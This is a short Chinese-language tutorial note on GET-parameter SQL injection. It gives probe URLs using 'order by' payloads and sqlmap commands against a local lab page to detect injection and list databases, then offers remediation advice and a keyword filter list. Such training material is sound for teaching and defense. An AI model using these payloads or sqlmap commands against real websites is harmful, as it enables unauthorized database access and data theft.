进行 get 型 SQL 注入需要一个带 get 型参数并且存在从数据库中返回数据的网站，多见于 URL，文本框。

可以进行如下尝试检测是否存在注入点：

```
http://127.0.0.1/index.php?id=1'order by 1%23

http://127.0.0.1/index.php?id=1'order by 2%23
```

其中只有数字的为==数字型== SQL 注入，剩下的注入就全都是==字符型==了，例如上述有'字符的为字符型注入

### 思路

1、访问连接显示如图

![[Pasted image 20220920224002.png]]

2、在1后面加入单引号发现报错，可能存在SQL注入

![[Pasted image 20220920224033.png]]

3、我们借助 sqlmap 工具来进行注入，payload如下：

```
sqlmap -u http://127.0.0.1:2333/pentest/sql-injection-get.php?id=1
```

注入利用成功：

![[Pasted image 20220920224134.png]]

4、获取数据库敏感信息

```
sqlmap -u http://127.0.0.1:2333/pentest/sql-injection-get.php?id=1 --dbs
```

![[Pasted image 20220920224327.png]]

### 修复建议

修改相关问题页面，对用户输入进行检验，过滤或转换可疑字符串，可以通过正则表达式，对单引号和双“-”进行转换，SQL查询语句不要使用动态拼装；使用存储过程进行参数化查询，在执行SQL查询命令前处理，可以有效的防止SQL注入，尤其注意对“select”、“from”、“+”等敏感字符的过滤或者转换。

建议修改Web应用服务的软件部分，增加对客户端提交数据的合法性验证，至少严格过滤SQL语句中的关键字，并且所有验证都应该在服务器端实现，以防客户端（IE页面代码部分）控制被绕过。

验证部分为get方法中URL后面跟的参数，及post方法中Post的数据参数，需过滤的关键字为：

```
[1] ' 单引号

[2] " 双引号

[3] \' 反斜行单引号

[4] \" 反斜杠双引号

[5] ) 括号

[6] ; 分号

[7]—双减号

[8]+  加号

[9]SQL关键字，如select，delete，drop等等，注意对于关键字要对大小写都识别，如:select ;SELECT;seLEcT等都应识别。
```

建议降低Web应用访问使用较低权限的用户访问数据库。不要使用数据库管理员等高权限的用户访问数据库。